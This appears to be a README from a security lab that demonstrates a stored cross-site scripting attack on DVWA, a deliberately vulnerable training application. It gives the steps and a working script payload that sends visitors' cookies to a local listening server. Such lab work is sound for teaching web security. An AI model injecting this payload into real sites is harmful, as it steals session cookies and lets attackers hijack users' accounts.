Stored-XSS

🔹 Description:
This folder demonstrates a Stored Cross-Site Scripting (XSS) attack using DVWA.

Steps followed

1. Launch DVWA in Docker and log in.
2. Set the DVWA Security Level to "Low".
3. Navigate to: "Vulnerabilities → XSS (Stored)"
4. Copy and paste the attack script into the "Message" field.
5. Start a Python HTTP server to catch the exfiltrated cookie.

Attack Script:

```html
<script>
window.location='http://127.0.0.1:3000/?cookie=' + document.cookie;
</script>
```

Screenshot:

* `screenshot1.png` to `screenshot5.png` show successful execution and cookie capture stages.

Notes:

* Stored XSS saves the malicious script in the server/database.
* The attack is triggered when any user views the infected page.
* It is persistent and considered more dangerous than reflected XSS.

Files:

* `attack_script.txt`: Contains the payload used.
* `python_http_server_setup.txt`: Shows how to start a Python server.
* `screenshot1.png` to `screenshot5.png`: Proof of successful execution.

